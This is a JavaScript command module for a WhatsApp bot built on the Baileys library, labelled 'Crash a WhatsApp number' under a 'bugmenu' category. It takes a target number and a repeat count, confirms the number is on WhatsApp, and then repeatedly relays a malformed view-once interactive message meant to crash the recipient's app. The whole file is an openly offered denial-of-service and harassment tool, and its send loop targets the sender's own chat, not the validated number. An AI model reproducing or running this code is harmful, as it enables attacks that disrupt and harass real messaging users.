const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

cmd({
    pattern: "maria-crash",
    react: "💥",
    desc: "Crash a WhatsApp number",
    category: "bugmenu",
    use: '.maria-crash <number>,<amount>',
    filename: __filename
}, async (message, match) => {
    try {
        // Check if the input format is correct
        if (!match || !match.includes(',')) {
            return await message.reply("Incorrect format, type .maria-crash, 234704xxxxxxx, 4");
        }

        // Extract number and count
        const [_, number, countStr] = match.split(',');
        const count = parseInt(countStr);

        // Validate number
        if (!number || !number.match(/^\d+$/)) {
            return await message.reply("Invalid number format");
        }

        // Validate count
        if (!count || isNaN(count) || count < 1) {
            return await message.reply("Invalid crash amount (must be at least 1)");
        }

        // Check if number exists on WhatsApp
        const jid = number.includes('@') ? number : `${number}@s.whatsapp.net`;
        const [user] = await message.client.onWhatsApp(jid);
        
        if (!user || !user.exists) {
            return await message.reply(`The number ${number} does not exist on WhatsApp. Use a number that is on WhatsApp.`);
        }

        // Start crashing
        await message.reply(`Please wait, I'm crashing ${number} ${count} times...`);

        // Bug function
        async function bugfunc(Ptcp = false) {
            let etc = generateWAMessageFromContent(message.jid, proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                locationMessage: {},
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "ɴɪᴋᴋᴀ-ᴍᴅ"
                            },
                            nativeFlowMessage: {
                                name: "call_permission_request",
                                messageParamsJson: "ᴍᴀʀɪᴀ-ᴍᴅ"
                            },
                            carouselMessage: {}
                        }
                    }
                }
            }), {
                userJid: message.jid,
                quoted: message
            });

            await message.client.relayMessage(message.jid, etc.message, Ptcp ? {
                participant: {
                    jid: message.jid
                }
            } : {});
        }

        // Execute the bug function
        for (let i = 0; i < count; i++) {
            await bugfunc(false);
            await bugfunc(true);
        }

        await message.reply("Done by maria-md ✅");

    } catch (error) {
        console.error("Error in maria-crash:", error);
        await message.reply("An error occurred while processing your request.");
    }
});